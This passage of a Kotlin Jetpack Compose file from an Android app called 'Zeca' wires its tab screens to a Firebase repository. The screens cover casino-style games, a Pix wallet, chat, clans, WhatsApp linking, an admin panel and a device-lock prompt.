        FirebaseRepository.garantirPerfil(usuario) { error ->
            erroPerfil = error?.localizedMessage.orEmpty()
            if (error == null) carregarSaldo()
        }
        onDispose {
            profileRegistration.remove()
            balanceRegistration.remove()
            conversationsRegistration.remove()
            globalMessagesRegistration.remove()
        }
    }

    LaunchedEffect(usuario.uid, appForeground, aba) {
        if (!appForeground) return@LaunchedEffect
        if (aba == Aba.Inicio) carregarRanking()
        if (aba == Aba.Carteira) carregarMovimentos()
        while (true) {
            delay(30_000)
            carregarSaldo()
            if (aba == Aba.Inicio) carregarRanking()
            if (aba == Aba.Carteira) carregarMovimentos()
        }
    }

    val notificacaoAtual = notificacoes.firstOrNull()
    LaunchedEffect(notificacaoAtual?.id) {
        val atual = notificacaoAtual ?: return@LaunchedEffect
        delay(5_000)
        if (notificacoes.firstOrNull()?.id == atual.id) notificacoes.removeAt(0)
    }

    val jogador = perfil?.let { profile ->
        saldoFinanceiro?.let { balance -> profile.copy(saldoCentavos = balance) }
    }
    if (bloqueioDispositivoAtivo && !dispositivoDesbloqueado) {
        Box(
            Modifier.fillMaxSize().background(Cores.Fundo),
            contentAlignment = Alignment.Center,
        ) {
            androidx.compose.foundation.layout.Column(horizontalAlignment = Alignment.CenterHorizontally) {
                androidx.compose.material3.Text("Zeca bloqueado", color = Color.White, fontSize = 22.sp, fontWeight = FontWeight.Bold)
                androidx.compose.material3.Text("Confirme sua identidade para continuar.", color = Color.White.copy(alpha = 0.7f))
                androidx.compose.material3.Button(onClick = {
                    promptDispensado = false
                    tentativaAutenticacao += 1
                }) { androidx.compose.material3.Text("Tentar desbloquear") }
                androidx.compose.material3.TextButton(onClick = {
                    mudancaBloqueioPendente = false
                    promptDispensado = false
                    tentativaAutenticacao += 1
                }) { androidx.compose.material3.Text("Desativar proteção", color = Cores.Turquesa) }
            }
        }
    } else if (jogador == null) {
        Box(Modifier.fillMaxSize().background(Cores.Fundo), contentAlignment = Alignment.Center) {
            androidx.compose.foundation.layout.Column(horizontalAlignment = Alignment.CenterHorizontally) {
                androidx.compose.material3.CircularProgressIndicator(color = Cores.Verde)
                androidx.compose.material3.Text(
                    erroPerfil.ifBlank {
                        erroSaldo.ifBlank {
                            if (carregandoSaldo) "Carregando sua carteira..." else "Saldo temporariamente indisponível."
                        }
                    },
                    modifier = Modifier.padding(20.dp),
                    color = Color.White,
                )
                if (perfil != null && erroSaldo.isNotBlank()) {
                    androidx.compose.material3.TextButton(onClick = { carregarSaldo() }) {
                        androidx.compose.material3.Text("Tentar novamente", color = Cores.Turquesa)
                    }
                } else if (erroPerfil.isNotBlank()) {
                    androidx.compose.material3.TextButton(onClick = { FirebaseRepository.sair() }) {
                        androidx.compose.material3.Text("Sair")
                    }
                }
            }
        }
    } else if (!jogador.profileSetupComplete || jogador.username.isBlank()) {
        TelaConfigurarPerfil(
            nomeInicial = jogador.apelido,
            avatarUrlInicial = jogador.avatarUrl,
            onEnviarFoto = { uri, concluir ->
                FirebaseRepository.enviarFotoPerfil(uri, contexto.contentResolver) { url, error ->
                    concluir(url, error?.localizedMessage)
                }
            },
            onSalvarPerfil = { username, displayName, avatarUrl, avatarComoFoto, concluir ->
                FirebaseRepository.atualizarPerfil(username, displayName, avatarUrl, avatarComoFoto, "") { error ->
                    concluir(error?.localizedMessage)
                }
            },
        )
    } else {
        Box(Modifier.fillMaxSize().background(Cores.Fundo)) {
            Crossfade(
                targetState = aba,
                animationSpec = androidx.compose.animation.core.tween(
                    durationMillis = if (Cores.ReduzirMovimento) 0 else 220,
                ),
                label = "aba",
            ) { atual ->
                stateHolder.SaveableStateProvider(atual.name) {
                    when (atual) {
                        Aba.Inicio -> TelaInicio(
                            saldoCentavos = jogador.saldoCentavos,
                            atividadeRecente = movimentos.take(3).map { it.titulo },
                            ranking = ranking,
                            erroSincronizacao = erroPerfil.ifBlank { erroSaldo },
                            carregandoRanking = carregandoRanking,
                            erroRanking = erroRanking,
                            ganhoTotalCentavos = jogador.ganhoTotalCentavos,
                            perdaTotalCentavos = jogador.perdaTotalCentavos,
                            onCarregarMissoes = { concluir -> FirebaseRepository.carregarMissoes(concluir) },
                            onAbrirAba = { aba = it },
                            onAbrirLoja = {
                                mostrarLoja = true
                                mostrarTrabalho = false
                                aba = Aba.Perfil
                            },
                            onAbrirTrabalho = {
                                mostrarLoja = false
                                mostrarTrabalho = true
                                aba = Aba.Perfil
                            },
                            onBuscarPerfil = { uid, concluir ->
                                FirebaseRepository.buscarPerfilPublico(uid, concluir)
                            },
                        )
                        Aba.Jogos -> TelaJogos(
                            saldoCentavos = jogador.saldoCentavos,
                            partidas = jogador.partidas,
                            uidAtual = usuario.uid,
                            clanId = jogador.clanId,
                            jogadores = ranking,
                            roomInviteId = tugInviteRoomId,
                            onRoomInviteHandled = onTugInviteHandled,
                            onCarregarConfiguracaoMinas = { concluir ->
                                FirebaseRepository.carregarConfiguracaoMinas(concluir)
                            },
                            onCarregarMinasAtiva = { concluir ->
                                FirebaseRepository.carregarMinasAtiva(concluir)
                            },
                            onCarregarPartidasEsportivas = { concluir ->
                                FirebaseRepository.carregarPartidasEsportivas(concluir)
                            },
                            onCarregarApostasEsportivas = { concluir ->
                                FirebaseRepository.listarApostasEsportivas(concluir)
                            },
                            onApostarEsportiva = { pernas, valor, requestId, concluir ->
                                FirebaseRepository.apostarPartidaEsportiva(pernas, valor, requestId, concluir)
                            },
                            onLiquidarApostasEsportivas = { concluir ->
                                FirebaseRepository.liquidarApostasEsportivas(concluir)
                            },
                            onCarregarSalasCaboGuerra = { concluir -> FirebaseRepository.listarSalasCaboGuerra(concluir) },
                            onCarregarPredefinicoesSala = { concluir -> FirebaseRepository.carregarPredefinicoesSala(concluir) },
                            onSalvarPredefinicoesSala = { predefs, concluir ->
                                FirebaseRepository.salvarPredefinicoesSala(predefs, concluir)
                            },
                            onCarregarMensagensSala = { roomId, concluir ->
                                FirebaseRepository.carregarMensagensSala(roomId, concluir)
                            },
                            onEnviarMensagemSala = { roomId, text, quickId, requestId, concluir ->
                                FirebaseRepository.enviarMensagemSala(roomId, text, quickId, requestId, concluir)
                            },
                            onObservarFilaJokenpo = { callback -> FirebaseRepository.observarFilaJokenpo(callback) },
                            onObservarPartidaJokenpo = { matchId, callback -> FirebaseRepository.observarPartidaJokenpo(matchId, callback) },
                            onBuscarAdversarioJokenpo = { gameId, requestId, concluir ->
                                FirebaseRepository.buscarAdversarioJokenpo(gameId, requestId, concluir)
                            },
                            onCancelarFilaJokenpo = { concluir -> FirebaseRepository.cancelarFilaJokenpo(concluir) },
                            onJogarJokenpo = { matchId, escolha, requestId, concluir ->
                                FirebaseRepository.jogarJokenpo(matchId, escolha, requestId, concluir)
                            },
                            onPedirRevancheJokenpo = { matchId, requestId, concluir ->
                                FirebaseRepository.pedirRevancheJokenpo(matchId, requestId, concluir)
                            },
                            onCriarSalaCaboGuerra = { aposta, convites, senha, modo, gameId, clanId, requestId, concluir ->
                                FirebaseRepository.criarSalaCaboGuerra(aposta, convites, senha, modo, gameId, clanId, requestId, concluir)
                            },
                            onEntrarSalaCaboGuerra = { roomId, senha, requestId, concluir ->
                                FirebaseRepository.entrarSalaCaboGuerra(roomId, senha, requestId, concluir)
                            },
                            onGerenciarSalaCaboGuerra = { roomId, acao, requestId, targetUid, aposta, senha, concluir ->
                                FirebaseRepository.gerenciarSalaCaboGuerra(roomId, acao, requestId, targetUid, aposta, senha, concluir)
                            },
                            onIniciarSalaCaboGuerra = { roomId, concluir -> FirebaseRepository.iniciarSalaCaboGuerra(roomId, concluir) },
                            onPuxarCordaCaboGuerra = { roomId, count, requestId, concluir ->
                                FirebaseRepository.puxarCordaCaboGuerra(roomId, count, requestId, concluir)
                            },
                            onIniciarMinas = { aposta, minas, requestId, concluir ->
                                FirebaseRepository.iniciarMinas(aposta, minas, requestId, concluir)
                            },
                            onRevelarMinas = { gameId, casa, requestId, concluir ->
                                FirebaseRepository.revelarCasaMinas(gameId, casa, requestId, concluir)
                            },
                            onSacarMinas = { gameId, requestId, concluir ->
                                FirebaseRepository.sacarMinas(gameId, requestId, concluir)
                            },
                            onJogar = { jogo, aposta, tipo, selecao, requestId, concluir ->
                                FirebaseRepository.jogar(jogo, aposta, tipo, selecao, requestId) { resultado, error ->
                                    concluir(resultado, error)
                                }
                            },
                            onIniciarDesafioSolo = { jogo, aposta, requestId, concluir ->
                                FirebaseRepository.iniciarDesafioSolo(jogo, aposta, requestId, concluir)
                            },
                            onIniciarCrash = { aposta, requestId, concluir ->
                                FirebaseRepository.iniciarCrash(aposta, requestId) { sessao, error -> concluir(sessao, error) }
                            },
                            onSacarCrash = { gameId, requestId, concluir ->
                                FirebaseRepository.sacarCrash(gameId, requestId) { resultado, error -> concluir(resultado, error) }
                            },
                            onIniciarBlackjack = { aposta, requestId, concluir ->
                                FirebaseRepository.iniciarBlackjack(aposta, requestId) { estado, error -> concluir(estado, error) }
                            },
                            onAcaoBlackjack = { gameId, acao, requestId, concluir ->
                                FirebaseRepository.acaoBlackjack(gameId, acao, requestId) { estado, error -> concluir(estado, error) }
                            },
                        )
                        Aba.Comunidade -> TelaRecursosSociais(
                            usuarioAtualId = usuario.uid,
                            clas = recursosSociais.clas,
                            convites = recursosSociais.convites,
                            claAtualId = recursosSociais.claAtualId,
                            rankingClas = recursosSociais.rankingClas,
                            eventoSemanal = recursosSociais.eventoSemanal,
                            conquistas = recursosSociais.conquistas,
                            historico = recursosSociais.historico,
                            estatisticasPorJogo = recursosSociais.estatisticasPorJogo,
                            atualizacoesDenuncias = recursosSociais.atualizacoesDenuncias,
                            estado = EstadoCarregamentoSocial(
                                clãsCarregando = recursosSociaisCarregando,
                                eventoCarregando = recursosSociaisCarregando,
                                conquistasCarregando = recursosSociaisCarregando,
                                historicoCarregando = recursosSociaisCarregando,
                                erros = erroRecursosSociais?.let {
                                    mapOf("clãs" to it, "evento" to it, "conquistas" to it, "histórico" to it)
                                }.orEmpty(),
                            ),
                            onCriarCla = { rascunho, concluir ->
                                FirebaseRepository.criarCla(rascunho, concluirAcaoSocial(concluir))
                            },
                            onEntrarCla = { id, concluir ->
                                FirebaseRepository.entrarCla(id, concluirAcaoSocial(concluir))
                            },
                            onSolicitarEntradaCla = { id, concluir ->
                                FirebaseRepository.solicitarEntradaCla(id, concluirAcaoSocial(concluir))
                            },
                            onEntrarComConvite = { codigo, concluir ->
                                FirebaseRepository.entrarComConvite(codigo, concluirAcaoSocial(concluir))
                            },
                            onAceitarConvite = { clanId, concluir ->
                                FirebaseRepository.aceitarConviteCla(clanId, concluirAcaoSocial(concluir))
                            },
                            onSairCla = { id, concluir ->
                                FirebaseRepository.sairCla(id, concluirAcaoSocial(concluir))
                            },
                            onConvidarUsuario = { claId, usuarioId, concluir ->
                                FirebaseRepository.convidarUsuario(claId, usuarioId, concluirAcaoSocial(concluir))
                            },
                            onAprovarSolicitacao = { claId, usuarioId, concluir ->
                                FirebaseRepository.aprovarSolicitacaoCla(claId, usuarioId, concluirAcaoSocial(concluir))
                            },
                            onRemoverMembro = { claId, usuarioId, concluir ->
                                FirebaseRepository.removerMembroCla(claId, usuarioId, concluirAcaoSocial(concluir))
                            },
                            onResgatarRecompensa = { eventId, concluir ->
                                FirebaseRepository.resgatarRecompensaSemanal(eventId, concluirAcaoSocial(concluir))
                            },
                            onEnviarDenuncia = { denuncia, concluir ->
                                FirebaseRepository.enviarDenuncia(denuncia, concluir)
                            },
                        )
                        Aba.Conta -> TelaCentralConta(
                            painel = painelConta,
                            eventoSemanal = recursosSociais.eventoSemanal,
                            carregando = carregandoPainelConta,
                            erro = erroPainelConta,
                            bloqueioDispositivoAtivo = bloqueioDispositivoAtivo,
                            isAdmin = ehAdmin,
                            onRecarregar = { carregarPainelConta() },
                            onCriarCodigoVinculoWhatsApp = { complete ->
                                FirebaseRepository.criarCodigoVinculoWhatsApp(complete)
                            },
                            onDesvincularWhatsApp = { complete ->
                                FirebaseRepository.desvincularWhatsApp(complete)
                            },
                            onCarregarPainelWhatsApp = { complete ->
                                FirebaseRepository.carregarPainelWhatsApp(complete)
                            },
                            onResgatarMissaoWhatsApp = { missionId, complete ->
                                FirebaseRepository.resgatarMissaoWhatsApp(missionId, complete)
                            },
                            onAbrirWhatsApp = { message ->
                                val whatsappUrl = if (message.isBlank()) {
                                    "https://wa.me/"
                                } else {
                                    "https://wa.me/?text=${Uri.encode(message)}"
                                }
                                val intent = Intent(
                                    Intent.ACTION_VIEW,
                                    Uri.parse(whatsappUrl),
                                )
                                try {
                                    contexto.startActivity(intent)
                                } catch (error: android.content.ActivityNotFoundException) {
                                    android.widget.Toast.makeText(
                                        contexto,
                                        error.localizedMessage ?: "Não foi possível abrir o WhatsApp.",
                                        android.widget.Toast.LENGTH_LONG,
                                    ).show()
                                }
                            },
                            onCompartilharFigurinha = { uri ->
                                val mimeType = contexto.contentResolver.getType(uri) ?: "image/*"
                                val shareIntent = Intent(Intent.ACTION_SEND).apply {
                                    type = mimeType
                                    putExtra(Intent.EXTRA_STREAM, uri)
                                    putExtra(Intent.EXTRA_TEXT, "!s")
                                    clipData = android.content.ClipData.newUri(
                                        contexto.contentResolver,
                                        "Imagem para figurinha",
                                        uri,
                                    )
                                    addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION)
                                }
                                contexto.startActivity(Intent.createChooser(shareIntent, "Enviar imagem ao bot"))
                            },
                            onSalvarPreferencias = { preferences, complete ->
                                FirebaseRepository.salvarPreferenciasConta(preferences) { error ->
                                    if (error == null) {
                                        Cores.aplicarTema(preferences.theme)
                                        Cores.aplicarAcessibilidade(
                                            preferences.accessibilityFontScale.toFloat(),
                                            preferences.highContrast,
                                            preferences.reduceMotion,
                                        )
                                        Locale.setDefault(Locale.forLanguageTag(preferences.locale))
                                        deviceLockPreferences.edit()
                                            .putString("theme", preferences.theme)
                                            .putString("locale", preferences.locale)
                                            .putFloat("accessibilityFontScale", preferences.accessibilityFontScale.toFloat())
                                            .putBoolean("highContrast", preferences.highContrast)
                                            .putBoolean("reduceMotion", preferences.reduceMotion)
                                            .putBoolean("confirmImportant", preferences.confirmImportant)
                                            .putBoolean("personalizedRecommendations", preferences.personalizedRecommendations)
                                            .apply()
                                    }
                                    complete(error)
                                }
                            },
                            onGerenciarAmigo = { action, username, targetUid, complete ->
                                FirebaseRepository.gerenciarAmigo(action, username, targetUid, complete)
                            },
                            onDefinirBloqueio = { enabled ->
                                val keyguard = contexto.getSystemService(KeyguardManager::class.java)
                                if (keyguard?.isDeviceSecure != true) {
                                    android.widget.Toast.makeText(
                                        contexto,
                                        "Configure PIN, padrão ou senha de bloqueio no Android primeiro.",
                                        android.widget.Toast.LENGTH_LONG,
                                    ).show()
                                } else {
                                    val intent = keyguard.createConfirmDeviceCredentialIntent(
                                        "Confirmar proteção do Zeca",
                                        "Confirme sua identidade para alterar esta configuração.",
                                    )
                                    if (intent == null) {
                                        android.widget.Toast.makeText(contexto, "Não foi possível abrir a autenticação do dispositivo.", android.widget.Toast.LENGTH_LONG).show()
                                    } else {
                                        mudancaBloqueioPendente = enabled
                                        solicitacaoAutenticacaoPendente = true
                                        autenticadorDispositivo.launch(intent)
                                    }
                                }
                            },
                            onPublicarAviso = { title, details, type, expiresAtMs, complete ->
                                FirebaseRepository.publicarAvisoApp(title, details, type, expiresAtMs, complete)
                            },
                            onEnviarSuporte = { title, details, category, complete ->
                                FirebaseRepository.enviarSolicitacaoSuporte(title, details, category, complete)
                            },
                            onVoltar = { aba = Aba.Perfil },
                        )
                        Aba.Carteira -> if (mostrarMaquininha) {
                            Box(Modifier.fillMaxSize().statusBarsPadding().padding(bottom = 96.dp)) {
                                TelaMaquininha(onVoltar = { mostrarMaquininha = false })
                            }
                        } else if (mostrarPagar) {
                            Box(Modifier.fillMaxSize().statusBarsPadding().padding(bottom = 96.dp)) {
                                TelaPagar(onVoltar = { mostrarPagar = false })
                            }
                        } else if (mostrarCartoes) {
                            Box(Modifier.fillMaxSize().statusBarsPadding().padding(bottom = 96.dp)) {
                                TelaCartoes(onVoltar = { mostrarCartoes = false })
                            }
                        } else Column(Modifier.fillMaxSize()) {
                            Row(
                                modifier = Modifier
                                    .fillMaxWidth()
                                    .statusBarsPadding()
                                    .padding(horizontal = 14.dp, vertical = 8.dp),
                                horizontalArrangement = Arrangement.spacedBy(10.dp),
                            ) {
                                androidx.compose.material3.Button(
                                    onClick = { mostrarMaquininha = true },
                                    modifier = Modifier.weight(1f),
                                ) { Text("Maquininha") }
                                androidx.compose.material3.OutlinedButton(
                                    onClick = { mostrarPagar = true },
                                    modifier = Modifier.weight(1f),
                                ) { Text("Pagar com QR") }
                                androidx.compose.material3.OutlinedButton(
                                    onClick = { mostrarCartoes = true },
                                    modifier = Modifier.weight(1f),
                                ) { Text("Cartões") }
                            }
                            TelaCarteira(
                            linkPagamentoRecebido = pixPaymentLink,
                            onLinkPagamentoRecebido = onPixPaymentLinkHandled,
                            saldoCentavos = jogador.saldoCentavos,
                            chavePix = jogador.chavePix,
                            tipoChavePix = jogador.tipoChavePix,
                            telefonePix = jogador.numeroTelefone,
                            telefonePixVerificado = jogador.telefoneVerificado,
                            historico = movimentos,
                            erroFinanceiro = erroSaldo,
                            carregandoHistorico = carregandoMovimentos,
                            erroHistorico = erroMovimentos,
                            emailConta = usuario.email.orEmpty(),
                            emailVerificadoInicial = usuario.isEmailVerified,
                            onReenviarVerificacao = { concluir ->
                                FirebaseRepository.reenviarVerificacaoEmail { error ->
                                    concluir(error?.localizedMessage)
                                }
                            },
                            onConferirVerificacao = { concluir ->
                                FirebaseRepository.conferirEmailVerificado { verificado, error ->
                                    concluir(verificado, error?.localizedMessage)
                                }
                            },
                            onSalvarChave = { tipo, chave, concluir ->
                                FirebaseRepository.registrarChavePix(tipo, chave) { error ->
                                    concluir(error?.localizedMessage)
                                }
                            },
                            onBuscarDestinatario = { chave, concluir ->
                                FirebaseRepository.buscarChavePix(chave) { destino, error ->
                                    concluir(destino, error?.localizedMessage)
                                }
                            },
                            onTransferir = { chave, valor, requestId, concluir ->
                                FirebaseRepository.transferirPorPix(chave, valor, requestId) { resultado, error ->
                                    concluir(resultado, error?.localizedMessage)
                                }
                            },
                        )
                        }
                        Aba.Chat -> TelaChat(
                            uidAtual = usuario.uid,
                            chavePixAtual = jogador.chavePix,
                            jogadores = ranking,
                            onBuscarJogadores = { prefixo, concluir ->
                                FirebaseRepository.buscarJogadoresPorUsername(prefixo, concluir)
                            },
                            presencas = presencasChat,
                            onAtualizarDigitando = { chatIdDigitando ->
                                FirebaseRepository.atualizarPresencaChat(
                                    online = appForeground,
                                    jogoAtivo = if (aba == Aba.Jogos) "Jogando" else "",
                                    conversaDigitandoId = chatIdDigitando,
                                )
                            },
                            onEnviar = { destinatarioUid, grupoId, texto, requestId, resposta, concluir ->
                                FirebaseRepository.enviarMensagemChat(
                                    destinatarioUid,
                                    texto,
                                    requestId,
                                    resposta,
                                    chatId = grupoId,
                                ) { _, error ->
                                    concluir(error)
                                }
                            },
                            onEnviarAudio = { destinatarioUid, grupoId, arquivo, duracaoMs, requestId, concluir ->
                                FirebaseRepository.enviarAudioChat(
                                    arquivo,
                                    duracaoMs,
                                    destinatarioUid,
                                    grupoId,
                                    requestId,
                                    concluir,
                                )
                            },
                            onEncaminhar = { destinatarioUid, grupoId, texto, requestId, concluir ->
                                FirebaseRepository.enviarMensagemChat(
                                    destinatarioUid,
                                    texto,
                                    requestId,
                                    null,
                                    encaminhada = true,
                                    chatId = grupoId,
                                ) { _, error ->
                                    concluir(error)
                                }
                            },
                            onCriarGrupo = { nome, descricao, membros, editPolicy, sendPolicy, requestId, concluir ->
                                FirebaseRepository.criarGrupo(nome, descricao, membros, editPolicy, sendPolicy, requestId) { id, error ->
                                    concluir(id, error)
                                }
                            },
                            onAtualizarGrupo = { chatId, nome, descricao, editPolicy, sendPolicy, concluir ->
                                FirebaseRepository.atualizarGrupo(chatId, nome, descricao, editPolicy, sendPolicy, concluir)
                            },
                            onGerenciarMembros = { chatId, action, targetUid, memberUids, concluir ->
                                FirebaseRepository.gerenciarMembrosGrupo(chatId, action, targetUid, memberUids, concluir)
                            },
                            onDissolverGrupo = { chatId, concluir ->
                                FirebaseRepository.dissolverGrupoChat(chatId, concluir)
                            },
                            onEnviarFotoGrupo = { chatId, uri, concluir ->
                                FirebaseRepository.enviarFotoGrupo(uri, chatId, contexto.contentResolver) { error ->
                                    concluir(error?.localizedMessage)
                                }
                            },
                            onRenomearFoguinho = { chatId, nome, concluir ->
                                FirebaseRepository.renomearFoguinho(chatId, nome, concluir)
                            },
                            onApagarParaMim = { chatId, mensagemId, concluir ->
                                FirebaseRepository.apagarMensagemParaMim(chatId, mensagemId, concluir)
                            },
                            onApagarParaTodos = { chatId, mensagemId, concluir ->
                                FirebaseRepository.apagarMensagemParaTodos(chatId, mensagemId, concluir)
                            },
                            onEditarMensagem = { chatId, mensagemId, texto, concluir ->
                                FirebaseRepository.editarMensagemChat(chatId, mensagemId, texto, concluir)
                            },
                            onBuscarPerfil = { uid, concluir ->
                                FirebaseRepository.buscarPerfilPublico(uid, concluir)
                            },
                        )
                        Aba.Admin -> if (ehAdmin) {
                            if (mostrarDenunciasAdmin) {
                                TelaDenunciasAdmin(
                                    onVoltar = { mostrarDenunciasAdmin = false },
                                    onCarregar = { concluir -> FirebaseRepository.listarDenunciasAdmin(concluir) },
                                    onModerar = { id, status, bloquear, motivo, concluir ->
                                        FirebaseRepository.moderarDenuncia(id, status, bloquear, motivo, concluir)
                                    },
                                )
                            } else TelaAdmin(
                                onAbrirDenuncias = { mostrarDenunciasAdmin = true },
                                onCarregarUsuarios = { cursor, concluir ->
                                    FirebaseRepository.listarUsuariosAdmin(cursor, concluir)
                                },
                                onCarregarAvatarPublico = { uid, concluir ->
                                    FirebaseRepository.buscarResumoVisualLeaderboard(uid, concluir)
                                },
                                onCarregarDetalhes = { uid, concluir ->
                                    FirebaseRepository.carregarDetalhesAdmin(uid, concluir)
                                },
                                onCarregarConfiguracao = { concluir ->
                                    FirebaseRepository.carregarConfiguracaoMinas(concluir)
                                },
                                onAtualizarConfiguracao = { configuracao, motivo, requestId, concluir ->
                                    FirebaseRepository.atualizarConfiguracaoMinasAdmin(configuracao, motivo, requestId, concluir)
                                },
                                onAjustarSaldo = { uid, delta, motivo, requestId, concluir ->
                                    FirebaseRepository.ajustarSaldoAdmin(uid, delta, motivo, requestId, concluir)
                                },
                                onAtualizarInventario = { uid, acao, itemId, motivo, requestId, concluir ->
                                    FirebaseRepository.atualizarInventarioAdmin(uid, acao, itemId, motivo, requestId, concluir)
                                },
                                onDefinirBloqueio = { uid, bloqueado, motivo, requestId, concluir ->
                                    FirebaseRepository.definirBloqueioAdmin(uid, bloqueado, motivo, requestId, concluir)
                                },
                                onExcluirUsuario = { uid, confirmUid, motivo, requestId, concluir ->
                                    FirebaseRepository.excluirUsuarioAdmin(uid, confirmUid, motivo, requestId, concluir)
                                },
                                onCarregarTicketsSuporte = { concluir ->
                                    FirebaseRepository.carregarSolicitacoesSuporteAdmin { tickets, error ->
                                        concluir(tickets, error)
                                    }
                                },
                            )
                        } else {
                            aba = Aba.Inicio
                        }
                        Aba.Perfil -> if (mostrarLoja) {
                            TelaLoja(
                                saldoCentavos = jogador.saldoCentavos,
                                itensComprados = jogador.inventario,
                                apelido = jogador.apelido,
                                username = jogador.username,
                                avatarUrl = jogador.avatarUrl,
                                avatarItensEquipados = jogador.avatarItensEquipados,
                                avatarComoFotoPerfil = jogador.avatarComoFotoPerfil,
                                molduraEquipada = jogador.molduraEquipada,
                                tituloEquipado = jogador.tituloEquipado,
                                onVoltar = { mostrarLoja = false },
                                onComprar = { itemId, concluir ->
                                    FirebaseRepository.comprarCosmetico(itemId, concluir)
                                },
                                onEquiparAvatar = { slot, itemId, concluir ->
                                    FirebaseRepository.equiparItemAvatar(slot, itemId) { error -> concluir(error?.localizedMessage) }
                                },
                                onEquiparMoldura = { itemId, concluir ->
                                    FirebaseRepository.equiparMoldura(itemId) { error -> concluir(error?.localizedMessage) }
                                },
                                onEquiparTitulo = { itemId, concluir ->
                                    FirebaseRepository.equiparTitulo(itemId) { error -> concluir(error?.localizedMessage) }
                                },
                            )
                        } else if (mostrarTrabalho) {
                            TelaTrabalho(
                                onVoltar = { mostrarTrabalho = false },
                                onCarregar = { concluir -> FirebaseRepository.carregarCarreiraTrabalho(concluir) },
                                onCandidatar = { slug, concluir -> FirebaseRepository.candidatarTrabalho(slug, concluir) },
                                onDemitir = { concluir -> FirebaseRepository.pedirDemissaoTrabalho(concluir) },
                                onPromover = { concluir -> FirebaseRepository.solicitarPromocaoTrabalho(concluir) },
                                onIniciarTurno = { requestId, concluir ->
                                    FirebaseRepository.iniciarTurnoTrabalho(requestId, concluir)
                                },
                                onConcluirTurno = { sessionId, answer, concluir ->
                                    FirebaseRepository.concluirTurnoTrabalho(sessionId, answer, concluir)
                                },
                            )
                        } else {
                            TelaPerfil(
                                apelido = jogador.apelido,
                                username = jogador.username,
                                email = jogador.email,
                                saldoCentavos = jogador.saldoCentavos,
                                nivel = jogador.nivel,
                                partidas = jogador.partidas,
                                vitorias = jogador.vitorias,
                                avatarUrl = jogador.avatarUrl,
                                bio = jogador.bio,
                                avatarItensEquipados = jogador.avatarItensEquipados,
                                avatarComoFotoPerfil = jogador.avatarComoFotoPerfil,
                                inventario = jogador.inventario,
                                molduraEquipada = jogador.molduraEquipada,
                                tituloEquipado = jogador.tituloEquipado,
                                onEscolherMoldura = { itemId, concluir ->
                                    FirebaseRepository.equiparMoldura(itemId) { error -> concluir(error?.localizedMessage) }
                                },
                                onEnviarFoto = { uri, concluir ->
                                    FirebaseRepository.enviarFotoPerfil(uri, contexto.contentResolver) { url, error ->
                                        concluir(url, error?.localizedMessage)
                                    }
                                },
                                onSalvarPerfil = { username, nome, avatarUrl, avatarComoFoto, bio, concluir ->
                                    FirebaseRepository.atualizarPerfil(username, nome, avatarUrl, avatarComoFoto, bio) { error -> concluir(error?.localizedMessage) }
                                },
                                onEquiparItemAvatar = { slot, itemId, concluir ->
                                    FirebaseRepository.equiparItemAvatar(slot, itemId) { error -> concluir(error?.localizedMessage) }
                                },
                                onEquiparTitulo = { itemId, concluir ->
                                    FirebaseRepository.equiparTitulo(itemId) { error -> concluir(error?.localizedMessage) }
                                },
                                onAbrirLoja = { mostrarLoja = true },
                                onSair = { FirebaseRepository.sair() },
                                onAbrirConta = { aba = Aba.Conta },
                                confirmarAcoesImportantes = painelConta?.preferences?.confirmImportant ?: true,
                            )
                        }
                    }
                }
            }
            AnimatedVisibility(
                visible = notificacaoAtual != null,
                modifier = Modifier.align(Alignment.TopCenter).statusBarsPadding().zIndex(1f),
                enter = if (Cores.ReduzirMovimento) fadeIn(androidx.compose.animation.core.tween(0))
                else slideInVertically(initialOffsetY = { -it }) + fadeIn(),
                exit = if (Cores.ReduzirMovimento) fadeOut(androidx.compose.animation.core.tween(0))
                else slideOutVertically(targetOffsetY = { -it }) + fadeOut(),
            ) {
                notificacaoAtual?.let { notificacao ->
                    Row(
                        modifier = Modifier
                            .fillMaxWidth()
                            .padding(horizontal = 14.dp, vertical = 8.dp)
                            .clip(RoundedCornerShape(16.dp))
                            .background(Cores.Cartao)
                            .border(1.dp, Color.White.copy(alpha = 0.16f), RoundedCornerShape(16.dp))
                            .clickable {
                                aba = notificacao.aba
                                notificacoes.removeAll { it.id == notificacao.id }
                            }
                            .padding(horizontal = 14.dp, vertical = 12.dp),
                        horizontalArrangement = Arrangement.spacedBy(11.dp),
                        verticalAlignment = Alignment.CenterVertically,
                    ) {
                        Icon(Icons.Filled.Notifications, contentDescription = null, tint = Cores.Verde)
                        Column(Modifier.weight(1f)) {
                            Text(notificacao.titulo, color = Color.White, fontWeight = FontWeight.Bold, fontSize = 14.sp)
                            Text(notificacao.detalhe, color = Color.White.copy(alpha = 0.72f), fontSize = 12.sp, maxLines = 2)
                        }
                        IconButton(onClick = { notificacoes.removeAll { it.id == notificacao.id } }) {
                            Icon(Icons.Filled.Close, contentDescription = "Fechar notificação", tint = Color.White.copy(alpha = 0.7f))
                        }
                    }
                }
            }
            BarraInferior(
                atual = aba,
                mostrarAdmin = ehAdmin,
                onSelecionar = {
                    aba = it
                    mostrarLoja = false
                    mostrarTrabalho = false
                    mostrarMaquininha = false
                    mostrarPagar = false
                    mostrarCartoes = false
                },
                modifier = Modifier.align(Alignment.BottomCenter),
            )
        }
    }
}

@Composable
fun BarraInferior(
    atual: Aba,
    onSelecionar: (Aba) -> Unit,
    modifier: Modifier = Modifier,
    mostrarAdmin: Boolean = false,
) {
    Row(
        modifier = modifier
            .navigationBarsPadding()
            .padding(horizontal = 8.dp, vertical = 8.dp)
            .fillMaxWidth()
            .height(72.dp)
            .clip(RoundedCornerShape(24.dp))
            .background(
                Brush.verticalGradient(
                    listOf(Color.White.copy(alpha = 0.18f), Cores.Barra.copy(alpha = 0.88f)),
                ),
            )
            .border(1.dp, Color.White.copy(alpha = 0.26f), RoundedCornerShape(24.dp))
            .padding(horizontal = 4.dp, vertical = 4.dp)
            .then(if (Cores.ReduzirMovimento) Modifier else Modifier.animateContentSize()),
        verticalAlignment = Alignment.CenterVertically,
    ) {
        val abasVisiveis = Aba.entries.filter { (mostrarAdmin || it != Aba.Admin) && it != Aba.Conta }
        abasVisiveis.forEach { aba ->
            val selecionada = aba == atual
            Column(
                modifier = Modifier
                    .weight(1f)
                    .fillMaxHeight()
                    .clip(RoundedCornerShape(18.dp))
                    .clickable { onSelecionar(aba) }
                    .padding(vertical = 3.dp),
                horizontalAlignment = Alignment.CenterHorizontally,
                verticalArrangement = Arrangement.Center,
            ) {
                Box(
                    modifier = Modifier
